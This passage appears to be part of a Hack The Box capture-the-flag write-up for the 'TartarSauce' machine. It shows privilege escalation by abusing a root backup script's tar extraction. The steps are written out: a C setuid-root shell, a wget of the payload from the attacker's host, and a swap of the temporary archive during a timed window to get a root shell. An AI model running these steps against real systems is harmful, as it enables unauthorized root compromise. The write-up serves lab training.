+2020/11/25 17:59:36 CMD: UID=0    PID=19     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=18     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=176    | 
+2020/11/25 17:59:36 CMD: UID=0    PID=175    | 
+2020/11/25 17:59:36 CMD: UID=0    PID=174    | 
+2020/11/25 17:59:36 CMD: UID=0    PID=172    | 
+2020/11/25 17:59:36 CMD: UID=0    PID=17     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=16     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=15     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=14     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=13     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=1229   | /usr/sbin/apache2 -k start 
+2020/11/25 17:59:36 CMD: UID=0    PID=12     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=1167   | /sbin/agetty --noclear tty1 linux 
+2020/11/25 17:59:36 CMD: UID=107  PID=1136   | /usr/sbin/mysqld 
+2020/11/25 17:59:36 CMD: UID=0    PID=1128   | /sbin/iscsid 
+2020/11/25 17:59:36 CMD: UID=0    PID=1127   | /sbin/iscsid 
+2020/11/25 17:59:36 CMD: UID=0    PID=112    | 
+2020/11/25 17:59:36 CMD: UID=0    PID=11     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=10     | 
+2020/11/25 17:59:36 CMD: UID=0    PID=1      | /sbin/init 
+2020/11/25 18:00:04 CMD: UID=0    PID=6031   | 
+
+FIND UNUSUAL TAR COMMAND CALLED BACKUPERER
+2020/11/25 18:03:48 CMD: UID=0    PID=6127   | /usr/bin/sudo -u onuma /bin/tar -zcvf /var/tmp/.f52c840f439e803f0fd657b349dc2e8f05a94efa /var/www/html 
+2020/11/25 18:03:48 CMD: UID=1000 PID=6131   | /bin/tar -zcvf /var/tmp/.f52c840f439e803f0fd657b349dc2e8f05a94efa /var/www/html 
+2020/11/25 18:03:48 CMD: UID=1000 PID=6132   | gzip 
+2020/11/25 18:04:18 CMD: UID=0    PID=6138   | gzip -d 
+2020/11/25 18:04:18 CMD: UID=0    PID=6137   | /bin/tar -zxvf /var/tmp/.f52c840f439e803f0fd657b349dc2e8f05a94efa -C /var/tmp/check 
+2020/11/25 18:04:19 CMD: UID=0    PID=6140   | /bin/bash /usr/sbin/backuperer 
+2020/11/25 18:04:19 CMD: UID=0    PID=6139   | /bin/bash /usr/sbin/backuperer 
+2020/11/25 18:04:19 CMD: UID=0    PID=6141   | /bin/mv /var/tmp/.f52c840f439e803f0fd657b349dc2e8f05a94efa /var/backups/onuma-www-dev.bak 
+2020/11/25 18:04:19 CMD: UID=0    PID=6142   | /bin/rm -rf /var/tmp/check . ..
+
+REVIEW BACKUPERER SCRIPT
+onuma@TartarSauce:/tmp$ cat /usr/sbin/backuperer
+#!/bin/bash
+
+#-------------------------------------------------------------------------------------
+# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
+# ONUMA Dev auto backup program
+# This tool will keep our webapp backed up incase another skiddie defaces us again.
+# We will be able to quickly restore from a backup in seconds ;P
+#-------------------------------------------------------------------------------------
+
+# Set Vars Here
+basedir=/var/www/html
+bkpdir=/var/backups
+tmpdir=/var/tmp
+testmsg=$bkpdir/onuma_backup_test.txt
+errormsg=$bkpdir/onuma_backup_error.txt
+tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
+check=$tmpdir/check
+
+# formatting
+printbdr()
+{
+    for n in $(seq 72);
+    do /usr/bin/printf $"-";
+    done
+}
+bdr=$(printbdr)
+
+# Added a test file to let us see when the last backup was run
+/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg
+
+# Cleanup from last time.
+/bin/rm -rf $tmpdir/.* $check
+
+# Backup onuma website dev files.
+/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &
+
+# Added delay to wait for backup to complete if large files get added.
+/bin/sleep 30
+
+# Test the backup integrity
+integrity_chk()
+{
+    /usr/bin/diff -r $basedir $check$basedir
+}
+
+/bin/mkdir $check
+/bin/tar -zxvf $tmpfile -C $check
+if [[ $(integrity_chk) ]]
+then
+    # Report errors so the dev can investigate the issue.
+    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
+    integrity_chk >> $errormsg
+    exit 2
+else
+    # Clean up and save archive to the bkpdir.
+    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
+    /bin/rm -rf $check .*
+    exit 0
+fi
+
+CREATE SETUID ROOT ACCESS SCRIPT
+root@kali:~/htb/tartarsauce# vim setuid.c
+root@kali:~/htb/tartarsauce# cat setuid.c 
+#include <stdio.h>
+
+#include<stdlib.h>
+
+#include<unistd.h>
+
+int main ( int argc, char *argv[] )
+
+{
+
+setreuid(0,0);
+
+execve("/bin/sh", NULL, NULL);
+
+}
+root@kali:~/htb/tartarsauce# gcc -m32 -o setuid setuid.c
+root@kali:~/htb/tartarsauce# chmod 6555 setuid
+root@kali:~/htb/tartarsauce# ls -l
+total 2736
+-rw-r--r-- 1 root root    3492 Samh  25 17:09  38861.txt
+-rwxr-xr-x 1 root root    5491 Samh  25 14:46  php-reverse-shell.php
+-rw-r--r-- 1 root root 2656352 Samh  25 17:53  pspy32
+-rwxr-xr-x 1 root root    5492 Samh  25 14:47  rshell.php
+-rw-r--r-- 1 root root     150 Samh  25 18:08  setuid.c
+-rw-r--r-- 1 root root   31916 Samh  25 18:08  tartarsauce_writeup
+-rwxr-xr-x 1 root root    5492 Samh  25 17:09  wp-load.php
+
+TRANSFER SETUID SCRIPT
+ cd /var/tmp && wget 10.10.14.8/tts.tar.gz
+--2020-11-25 18:23:20--  http://10.10.14.8/tts.tar.gz
+Connecting to 10.10.14.8:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2712 (2.6K) [application/gzip]
+Saving to: 'tts.tar.gz'
+
+     0K ..                                                    100%  191M=0s
+
+2020-11-25 18:23:20 (191 MB/s) - 'tts.tar.gz' saved [2712/2712]
+
+CHECK WHEN BACKUPERER SCRIPT WILL RUN
+systemctl list-timers
+NEXT                         LEFT     LAST                         PASSED       UNIT                         ACTIVATES
+Thu 2020-11-26 11:39:12 EST  5s left  Thu 2020-11-26 11:34:12 EST  4min 54s ago backuperer.timer             backuperer.service
+Thu 2020-11-26 22:53:35 EST  11h left Thu 2020-11-26 11:19:01 EST  20min ago    apt-daily.timer              apt-daily.service
+Fri 2020-11-27 06:11:35 EST  18h left Thu 2020-11-26 11:19:01 EST  20min ago    apt-daily-upgrade.timer      apt-daily-upgrade.service
+Fri 2020-11-27 11:33:58 EST  23h left Thu 2020-11-26 11:33:58 EST  5min ago     systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+
+4 timers listed.
+Pass --all to see loaded but inactive timers, too.
+
+REVIEW FILE CREATION IN 30 SECONDS
+ls -la
+total 2632
+drwxrwxrwt  8 root  root     4096 Nov 26 11:34 .
+drwxr-xr-x 14 root  root     4096 Feb  9  2018 ..
+-rwxr-xr-x  1 onuma onuma 2656352 Nov 25 17:53 pspy32
+drwx------  3 root  root     4096 Nov 26 11:19 systemd-private-409bbecaaca246fab7ffe1f29a7d9c05-systemd-timesyncd.service-mXqdll
+drwx------  3 root  root     4096 Feb 17  2018 systemd-private-46248d8045bf434cba7dc7496b9776d4-systemd-timesyncd.service-en3PkS
+drwx------  3 root  root     4096 Feb 17  2018 systemd-private-7bbf46014a364159a9c6b4b5d58af33b-systemd-timesyncd.service-UnGYDQ
+drwx------  3 root  root     4096 Feb 15  2018 systemd-private-9214912da64b4f9cb0a1a78abd4b4412-systemd-timesyncd.service-bUTA2R
+drwx------  3 root  root     4096 Feb 15  2018 systemd-private-a3f6b992cd2d42b6aba8bc011dd4aa03-systemd-timesyncd.service-3oO5Td
+drwx------  3 root  root     4096 Feb 15  2018 systemd-private-c11c7cccc82046a08ad1732e15efe497-systemd-timesyncd.service-QYRKER
+-rw-r--r--  1 onuma onuma    2716 Nov 25 21:46 tts.tar.gz
+ls -la
+total 12472
+drwxrwxrwt  8 root  root      4096 Nov 26 11:39 .
+drwxr-xr-x 14 root  root      4096 Feb  9  2018 ..
+-rw-r--r--  1 onuma onuma 10076160 Nov 26 11:39 .f910b347f1567226dcfb018cf11781c009ca2dbb
+-rwxr-xr-x  1 onuma onuma  2656352 Nov 25 17:53 pspy32
+drwx------  3 root  root      4096 Nov 26 11:19 systemd-private-409bbecaaca246fab7ffe1f29a7d9c05-systemd-timesyncd.service-mXqdll
+drwx------  3 root  root      4096 Feb 17  2018 systemd-private-46248d8045bf434cba7dc7496b9776d4-systemd-timesyncd.service-en3PkS
+drwx------  3 root  root      4096 Feb 17  2018 systemd-private-7bbf46014a364159a9c6b4b5d58af33b-systemd-timesyncd.service-UnGYDQ
+drwx------  3 root  root      4096 Feb 15  2018 systemd-private-9214912da64b4f9cb0a1a78abd4b4412-systemd-timesyncd.service-bUTA2R
+drwx------  3 root  root      4096 Feb 15  2018 systemd-private-a3f6b992cd2d42b6aba8bc011dd4aa03-systemd-timesyncd.service-3oO5Td
+drwx------  3 root  root      4096 Feb 15  2018 systemd-private-c11c7cccc82046a08ad1732e15efe497-systemd-timesyncd.service-QYRKER
+-rw-r--r--  1 onuma onuma     2716 Nov 25 21:46 tts.tar.gz
+
+RENAME TEMP FILE TO ONE USED IN THE BACKUPERER SCRIPT
+cp /var/tmp/tts.tar.gz /var/tmp/.f910b347f1567226dcfb018cf11781c009ca2dbb
+ls -la
+total 2636
+drwxrwxrwt  8 root  root     4096 Nov 26 11:39 .
+drwxr-xr-x 14 root  root     4096 Feb  9  2018 ..
+-rw-r--r--  1 onuma onuma    2716 Nov 26 11:39 .f910b347f1567226dcfb018cf11781c009ca2dbb
+-rwxr-xr-x  1 onuma onuma 2656352 Nov 25 17:53 pspy32
+drwx------  3 root  root     4096 Nov 26 11:19 systemd-private-409bbecaaca246fab7ffe1f29a7d9c05-systemd-timesyncd.service-mXqdll
+drwx------  3 root  root     4096 Feb 17  2018 systemd-private-46248d8045bf434cba7dc7496b9776d4-systemd-timesyncd.service-en3PkS
+drwx------  3 root  root     4096 Feb 17  2018 systemd-private-7bbf46014a364159a9c6b4b5d58af33b-systemd-timesyncd.service-UnGYDQ
+drwx------  3 root  root     4096 Feb 15  2018 systemd-private-9214912da64b4f9cb0a1a78abd4b4412-systemd-timesyncd.service-bUTA2R
+drwx------  3 root  root     4096 Feb 15  2018 systemd-private-a3f6b992cd2d42b6aba8bc011dd4aa03-systemd-timesyncd.service-3oO5Td
+drwx------  3 root  root     4096 Feb 15  2018 systemd-private-c11c7cccc82046a08ad1732e15efe497-systemd-timesyncd.service-QYRKER
+-rw-r--r--  1 onuma onuma    2716 Nov 25 21:46 tts.tar.gz
+ls -la
+total 2640
+drwxrwxrwt  9 root  root     4096 Nov 26 11:39 .
+drwxr-xr-x 14 root  root     4096 Feb  9  2018 ..
+-rw-r--r--  1 onuma onuma    2716 Nov 26 11:39 .f910b347f1567226dcfb018cf11781c009ca2dbb
+drwxr-xr-x  3 root  root     4096 Nov 26 11:39 check
+-rwxr-xr-x  1 onuma onuma 2656352 Nov 25 17:53 pspy32
+drwx------  3 root  root     4096 Nov 26 11:19 systemd-private-409bbecaaca246fab7ffe1f29a7d9c05-systemd-timesyncd.service-mXqdll
+drwx------  3 root  root     4096 Feb 17  2018 systemd-private-46248d8045bf434cba7dc7496b9776d4-systemd-timesyncd.service-en3PkS
+drwx------  3 root  root     4096 Feb 17  2018 systemd-private-7bbf46014a364159a9c6b4b5d58af33b-systemd-timesyncd.service-UnGYDQ
+drwx------  3 root  root     4096 Feb 15  2018 systemd-private-9214912da64b4f9cb0a1a78abd4b4412-systemd-timesyncd.service-bUTA2R
+drwx------  3 root  root     4096 Feb 15  2018 systemd-private-a3f6b992cd2d42b6aba8bc011dd4aa03-systemd-timesyncd.service-3oO5Td
+drwx------  3 root  root     4096 Feb 15  2018 systemd-private-c11c7cccc82046a08ad1732e15efe497-systemd-timesyncd.service-QYRKER
+-rw-r--r--  1 onuma onuma    2716 Nov 25 21:46 tts.tar.gz
+
+systemctl list-timers
+NEXT                         LEFT          LAST                         PASSED       UNIT                         ACTIVATES
+Thu 2020-11-26 11:44:12 EST  2min 31s left Thu 2020-11-26 11:39:12 EST  2min 28s ago backuperer.timer             backuperer.service
+Thu 2020-11-26 22:53:35 EST  11h left      Thu 2020-11-26 11:19:01 EST  22min ago    apt-daily.timer              apt-daily.service
+Fri 2020-11-27 06:11:35 EST  18h left      Thu 2020-11-26 11:19:01 EST  22min ago    apt-daily-upgrade.timer      apt-daily-upgrade.service
+Fri 2020-11-27 11:33:58 EST  23h left      Thu 2020-11-26 11:33:58 EST  7min ago     systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+
+4 timers listed.
+Pass --all to see loaded but inactive timers, too.
+
+RUN SETUID SCRIPT
+/var/tmp/check/var/www/html/setuid
+id
+uid=0(root) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
+cat /root/root.txt
+#############################
+
+SYSTEM DETAILS
+lsb_release -a
+Distributor ID:	Ubuntu
+Description:	Ubuntu 16.04.4 LTS
+Release:	16.04
+Codename:	xenial
+No LSB modules are available.
+hostname
+TartarSauce
+ifconfig
+ens33     Link encap:Ethernet  HWaddr 00:50:56:b9:00:57  
+          inet addr:10.10.10.88  Bcast:10.10.10.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:4722 errors:0 dropped:2 overruns:0 frame:0
+          TX packets:3519 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:5649476 (5.6 MB)  TX bytes:284737 (284.7 KB)
+          Interrupt:19 Base address:0x2000 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:168 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:168 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:12448 (12.4 KB)  TX bytes:12448 (12.4 KB)
+
+
+
+
+
